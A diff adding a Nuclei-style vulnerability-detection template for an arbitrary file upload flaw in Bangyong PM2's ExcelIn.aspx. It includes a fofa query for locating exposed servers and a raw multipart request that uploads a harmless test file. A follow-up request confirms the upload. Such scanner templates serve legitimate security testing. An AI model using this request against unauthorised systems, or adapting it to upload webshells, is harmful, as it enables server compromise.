@@ -1,0 +1,58 @@
+id: ebsoft-pm2-excelin-file-upload
+
+info:
+  name: Bangyong PM2 Project Management System ExcelIn.aspx Arbitrary File Upload
+  author: Co5mos
+  severity: critical
+  description: |
+    Bangyong PM2 Project Management System's `ExcelIn.aspx` endpoint has an arbitrary file upload vulnerability that allows attackers to upload malicious files and execute arbitrary code on the server.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E9%82%A6%E6%B0%B8PM2%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E7%B3%BB%E7%BB%9FExcelIn.aspx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: 'body="PM2项目管理系统BS版增强工具.zip"'
+  tags: bangyong, file-upload, rce, ebsoft
+
+variables:
+  boundary: "{{rand_base(30)}}"
+
+http:
+  - raw:
+      - |
+        POST /FlowChartDefine/ExcelIn.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="__VIEWSTATE"
+
+        U6iRl9SqWWlhjIPJXIeFrsinqYAmYxenxFiyfWFMfWgnw3OtkceDLcdfRvB8pmUNGk44PvjZ6LlzPwDbJGmilsmhuX9LvOiuKadYa9iDdSipLW5JvUHjS89aGzKqr9fhih+p+/Mm+q2vrknhfEJJnQ==
+        ------{{boundary}}
+        Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+        FD259C0F
+        ------{{boundary}}
+        Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+        /pKblUYGQ+ibKtw4CCS2wzX+lmZIOB+x5ezYw0qJFbaUifUKlxNNRMKceZYgY/eAUUTaxe0gSvyv/oA8lUS7G7jPVqqrMEzYBVBl8dRkFWFwMqqjv1G9gXM/ZnIpnVSL
+        ------{{boundary}}
+        Content-Disposition: form-data; name="FileUpload1"; filename="1234.zip"
+        Content-Type: application/x-zip-compressed
+
+        {{url_decode("PK\x03\x04\x14\x00\x01\x00\x00\x00\xefl\xfaX\x1c:\xf5\xcb\x11\x00\x00\x00\x05\x00\x00\x00\x08\x00\x00\x001234.txt\xb0\x0c\x01\x08\xd1!\xd1Uv \xfal\x9b\xf4Q\xfd\xf8PK\x01\x02?\x00\x14\x00\x01\x00\x00\x00\xefl\xfaX\x1c:\xf5\xcb\x11\x00\x00\x00\x05\x00\x00\x00\x08\x00$\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x001234.txt\x0a\x00 \x00\x00\x00\x00\x00\x01\x00\x18\x00\x05\x8d\x9d.\x1e\xdf\xda\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00Z\x00\x00\x007\x00\x00\x00\x00\x00")}}
+        ------{{boundary}}
+        Content-Disposition: form-data; name="Button1"
+
+        模块导入
+        ------{{boundary}}--
+
+      - |
+        GET /FlowChartDefine/1234.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2 == 200
+          - contains(body_2, '12345')
+        condition: and
